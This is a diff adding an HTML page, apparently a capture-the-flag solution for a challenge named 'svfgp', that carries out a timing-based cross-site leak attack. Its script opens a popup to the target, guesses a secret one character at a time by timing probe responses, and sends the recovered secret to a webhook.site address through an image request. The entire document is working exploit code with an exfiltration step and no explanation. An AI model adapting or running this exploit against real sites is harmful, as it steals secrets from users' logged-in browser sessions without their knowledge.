@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+const TARGET = "https://svfgp.breakable.live/";
+const WEBHOOK = "https://webhook.site/a1531501-a3f0-4a05-b558-b492727a4089?secret=";
+const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
+const THRESHOLD = 300; // ms
+
+let win = open('about:blank', '_blank');
+if (!win) { document.body.innerText = 'Popup blocked!'; throw ''; }
+
+setTimeout(async () => {
+  let secret = '';
+  let baseline = await test('~');
+  while (true) {
+    let best = '', bestTime = 0;
+    for (let c of CHARSET) {
+      let time = await test(secret + c);
+      if (time > bestTime) { bestTime = time; best = c; }
+    }
+    if (bestTime > baseline + THRESHOLD) secret += best;
+    else break;
+  }
+  new Image().src = WEBHOOK + secret;
+  document.body.innerText = 'Secret: ' + secret;
+}, 500);
+
+function test(q) {
+  return new Promise(r => {
+    let rid = Math.random();
+    let start = performance.now();
+    function handler(e) {
+      if (e.data.type === 'svfgp-probe-done' && e.data.rid === rid) {
+        removeEventListener('message', handler);
+        r(performance.now() - start);
+      }
+    }
+    addEventListener('message', handler);
+    win.location = `${TARGET}?mode=probe&q=${encodeURIComponent(q)}&rid=${rid}`;
+    setTimeout(() => { removeEventListener('message', handler); r(0); }, 4000);
+  });
+}
+</script>
+</body>
+</html>
